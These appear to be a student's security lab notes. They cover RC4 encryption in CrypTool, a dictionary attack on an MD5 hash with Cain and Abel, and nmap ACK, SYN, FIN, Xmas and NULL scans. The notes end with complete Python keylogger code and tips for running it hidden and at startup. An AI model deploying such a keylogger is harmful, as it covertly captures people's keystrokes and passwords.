prac2 cryptotool
steps
Open the tool. Take new File and then type any text which we want to encrypt.
Select the option Symmetric(modern) from encrypt/decrypt and in that choose RC4.
First Encrypt the data then decrypt the data.After decryption we will get the same text as the output.
b) Use Cain and Abel for cracking Windows account password using Dictionary attack and to decode wireless network passwords 
Steps:1:Select tools in that select option hash Calculator.
2:After this type the password and click on calculate
3:Copy the MD5 text
4:Then in cracker option select MD5 option
5:Then paste the MD5 text here.
6:After this right click on the text and select the option Dictonary attack and in that window select the path from which folder it has to perform dictionary attack.
7:Click on Start button we will get the text in plain text format


prac4 Use NMap scanner to perform port scanning of various forms – ACK, SYN, FIN, NULL, XMAS
Command: 
nmap -sA -T4        scanme.nmap.org     -----ACK scan is enabled by specifying the -sA option When scanning unfiltered systems, open and closed ports will both return a RST packet. Nmap then labels them as unfiltered,meaning that they are reachable by the ACK packet, but whether they are open or closed is undetermined. Ports that don't respond, or send certain ICMP error messages back, are labeled filtered
nmap -p22,113,139   scanme.nmap.org      -----SYN It also allows clear, reliable differentiation between open,closed, and filtered states.
nmap -sF -T4 para , nmap -sF -T4      docsrv.caldera.com    ----FIN: Sets just the TCP FIN bit.
nmap -sX -T4        scanme.nmap.org   ----Xmas: Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree.
nmap –sN –p 22      scanme.nmap.org   ----NULL: Does not set any bits (TCP flag header is 0)

prac9 Create a simple keylogger using python
steps 
First install the pynput to perform keylogger
Then open idle and type the program
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

then save the file with .pyw extension and run
We can also copy our program to startup by shell:startup command
Now run the code and type anything from the keyboard we can record everything.
